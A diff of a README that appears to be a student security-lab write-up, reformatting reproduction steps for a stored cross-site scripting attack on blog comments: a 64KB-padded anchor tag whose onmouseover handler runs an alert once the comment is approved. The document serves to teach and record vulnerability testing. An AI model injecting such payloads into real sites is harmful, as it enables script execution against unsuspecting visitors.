@@ -18,7 +18,9 @@ Time spent: **8** hours spent in total
       - Use some sort of program or text generator to generate 64KB worht of text
       - Submit the following as a comment
       ```
-      <a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  [INSERT YOUR 64KB OF TEXT HERE WITHOUT THESE SQUARE BRACKETS]'></a>
+      <a title='x onmouseover=alert(unescape(/hello%20world/.source))
+      style=position:absolute;left:0;top:0;width:5000px;height:5000px  
+      [INSERT YOUR 64KB OF TEXT HERE WITHOUT THESE SQUARE BRACKETS]'></a>
       ```
       - Once approved, the script will execute when the comment is loaded
   - [ ] Affected source code:
